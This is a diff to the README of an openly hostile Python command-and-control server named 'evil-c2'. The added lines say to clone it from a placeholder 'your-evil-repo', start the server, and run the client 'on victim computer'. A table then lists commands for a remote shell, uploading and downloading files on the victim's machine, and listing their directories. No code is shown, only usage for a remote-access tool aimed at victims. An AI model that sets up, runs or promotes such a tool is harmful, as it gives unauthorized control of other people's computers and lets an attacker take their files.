@@ -24,3 +24,15 @@ This is a **fully functional** C2 server written in Python. It allows you to:
    ```bash
    git clone https://github.com/your-evil-repo/evil-c2.git
    cd evil-c2
+   sudo apt install python3
+   python3 c2_server.py
+Then on victim computer
+```bash
+python3 c2_client.py
+🔹 Available Commands
+Command	Description
+shell-Enter remote shell mode. Run any command like a god. 🐍
+upload <file_path>-Upload a file to the victim. 📤
+download <file_path>-Download a file from the victim. 📥
+list- List files in the victim’s current directory. 📂
+exit-Disconnect from the victim. 🚪
